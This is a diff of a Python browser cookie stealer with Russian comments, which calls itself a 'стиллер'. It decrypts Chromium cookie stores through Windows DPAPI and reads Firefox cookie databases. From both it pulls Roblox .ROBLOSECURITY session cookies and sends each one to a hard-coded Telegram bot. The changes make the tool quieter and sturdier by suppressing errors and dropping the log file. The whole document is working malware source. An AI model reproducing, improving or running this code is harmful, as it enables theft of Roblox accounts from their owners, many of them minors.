@@ -1,34 +1,17 @@
+# Конфигурация
 import os
 import sqlite3
 import json
 import requests
-import logging
-import subprocess
+import base64
 from shutil import copy2
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+import win32crypt  # Для расшифровки ключей Windows
 
-# Конфигурация
+# Конфиг Telegram
 TELEGRAM_TOKEN = "8081126269:AAH6WKbPLU0Vbg-pZWSSV9wE8d7Nr13pmmo"  # Замените на реальный токен бота
 CHAT_ID = "1962231620"       # Замените на реальный Chat ID
-LOG_FILE = "stiller.log"      # Файл логов
-
-# Настройка логов
-logging.basicConfig(
-    filename=LOG_FILE,
-    level=logging.INFO,
-    format="%(asctime)s - %(message)s",
-    datefmt="%Y-%m-%d %H:%M:%S"
-)
-
-def kill_browsers():
-    """Принудительно закрывает все целевые браузеры"""
-    browsers = [
-        "msedge.exe", "opera.exe", "browser.exe", 
-        "amigo.exe", "brave.exe", "firefox.exe"
-    ]
-    for browser in browsers:
-        subprocess.call(f"taskkill /f /im {browser}", shell=True)
 
 def decrypt_cookie(cookie, key):
     try:
@@ -40,70 +23,93 @@ def decrypt_cookie(cookie, key):
     except:
         return None
 
+def decrypt_key(encrypted_key):
+    try:
+        # Удалить префикс DPAPI и декодировать Base64
+        encrypted_key = base64.b64decode(encrypted_key)[5:]
+        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+    except:
+        return None
+
 def get_chromium_cookies(browser_path):
     cookies = []
     try:
+        # Проверка существования путей
+        cookies_path = os.path.join(browser_path, "Network", "Cookies")
+        local_state_path = os.path.join(browser_path, "Local State")
+        
+        if not os.path.exists(cookies_path) or not os.path.exists(local_state_path):
+            return []
+        
         # Копирование файлов
-        temp_cookie = os.path.join(os.getenv("TEMP"), "temp_cookie")
-        temp_local_state = os.path.join(os.getenv("TEMP"), "temp_local_state")
-        copy2(os.path.join(browser_path, "Network", "Cookies"), temp_cookie)
-        copy2(os.path.join(browser_path, "Local State"), temp_local_state)
+        temp_cookie = os.path.join(os.getenv("TEMP"), f"temp_cookie_{os.getpid()}")
+        temp_local_state = os.path.join(os.getenv("TEMP"), f"temp_local_state_{os.getpid()}")
+        copy2(cookies_path, temp_cookie)
+        copy2(local_state_path, temp_local_state)
 
-        # Расшифровка ключа
-        with open(temp_local_state, "r") as f:
-            key = json.load(f)["os_crypt"]["encrypted_key"]
-        key = default_backend().decrypt(key[5:], None)[:32]
+        # Извлечение ключа
+        with open(temp_local_state, "r", encoding="utf-8") as f:
+            local_state = json.load(f)
+        encrypted_key = local_state["os_crypt"]["encrypted_key"]
+        key = decrypt_key(encrypted_key)
+        if not key:
+            return []
 
         # Поиск куки
         conn = sqlite3.connect(temp_cookie)
         cursor = conn.cursor()
-        cursor.execute("SELECT name, encrypted_value FROM cookies WHERE host_key='.roblox.com' AND name='.ROBLOSECURITY'")
+        cursor.execute("""
+            SELECT name, encrypted_value 
+            FROM cookies 
+            WHERE host_key LIKE '%roblox.com' 
+            AND name='.ROBLOSECURITY'
+        """)
+        
         for name, encrypted_val in cursor.fetchall():
-            decrypted = decrypt_cookie(encrypted_val, key)
-            if decrypted: 
-                cookies.append(decrypted)
-                logging.info(f"Найдена кука в {os.path.basename(browser_path)}: {decrypted[:15]}...")
-
+            if encrypted_val[:3] == b'v10':  # Проверка версии шифрования
+                decrypted = decrypt_cookie(encrypted_val, key)
+                if decrypted: cookies.append(decrypted)
+        
         conn.close()
-        os.remove(temp_cookie)
-        os.remove(temp_local_state)
+        os.unlink(temp_cookie)
+        os.unlink(temp_local_state)
     except Exception as e:
-        logging.error(f"Ошибка в {browser_path}: {str(e)}")
+        pass
     return cookies
 
-def get_firefox_cookies(path):
+def get_firefox_cookies(profile_path):
     try:
-        # Копирование файла
-        temp_db = os.path.join(os.getenv("TEMP"), "temp_cookies.sqlite")
-        copy2(os.path.join(path, "cookies.sqlite"), temp_db)
-
-        # Поиск куки
+        cookies_path = os.path.join(profile_path, "cookies.sqlite")
+        if not os.path.exists(cookies_path):
+            return []
+        
+        temp_db = os.path.join(os.getenv("TEMP"), f"temp_cookies_{os.getpid()}.sqlite")
+        copy2(cookies_path, temp_db)
+        
         conn = sqlite3.connect(temp_db)
         cursor = conn.cursor()
-        cursor.execute("SELECT value FROM moz_cookies WHERE host='.roblox.com' AND name='.ROBLOSECURITY'")
+        cursor.execute("""
+            SELECT value 
+            FROM moz_cookies 
+            WHERE host LIKE '%roblox.com' 
+            AND name='.ROBLOSECURITY'
+        """)
         cookies = [row[0] for row in cursor.fetchall()]
-        for cookie in cookies:
-            logging.info(f"Найдена кука в Firefox: {cookie[:15]}...")
         conn.close()
-        os.remove(temp_db)
+        os.unlink(temp_db)
         return cookies
-    except Exception as e:
-        logging.error(f"Ошибка Firefox: {str(e)}")
+    except:
         return []
 
-def send_to_telegram(text, is_file=False):
-    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/"
-    if is_file:
-        files = {"document": open(text, "rb")}
-        requests.post(url + "sendDocument", data={"chat_id": CHAT_ID}, files=files)
-    else:
-        data = {"chat_id": CHAT_ID, "text": text}
-        requests.post(url + "sendMessage", data=data)
+def send_to_telegram(cookie):
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
+        data = {"chat_id": CHAT_ID, "text": f"ROBLOSECURITY: {cookie}"}
+        requests.post(url, data=data, timeout=10)
+    except:
+        pass
 
 def main():
-    kill_browsers()  # Закрываем браузеры перед стартом
-    logging.info("===== Запуск стиллера =====")
-
     browsers = {
         "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default"),
         "Opera": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
@@ -113,25 +119,21 @@ def main():
         "Firefox": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")
     }
 
-    all_cookies = []
+    found_cookies = set()
     for name, path in browsers.items():
-        if "Firefox" in name:
-            for profile in os.listdir(path):
-                if profile.endswith(".default-release"):
-                    all_cookies.extend(get_firefox_cookies(os.path.join(path, profile)))
+        if name == "Firefox":
+            if os.path.exists(path):
+                for profile in os.listdir(path):
+                    profile_path = os.path.join(path, profile)
+                    if os.path.isdir(profile_path):
+                        found_cookies.update(get_firefox_cookies(profile_path))
         elif os.path.exists(path):
-            all_cookies.extend(get_chromium_cookies(path))
+            found_cookies.update(get_chromium_cookies(path))
 
-    # Отправка результатов
-    if all_cookies:
-        for cookie in set(all_cookies):
-            send_to_telegram(f"ROBLOSECURITY: {cookie}")
-    else:
-        logging.warning("Куки .ROBLOSECURITY не найдены")
-
-    # Отправка логов
-    send_to_telegram(LOG_FILE, is_file=True)
-    logging.info("Логи отправлены в Telegram")
+    for cookie in found_cookies:
+        send_to_telegram(cookie)
 
 if __name__ == "__main__":
+    print("===== Запуск стиллера =====")
     main()
+    print("Операция завершена")
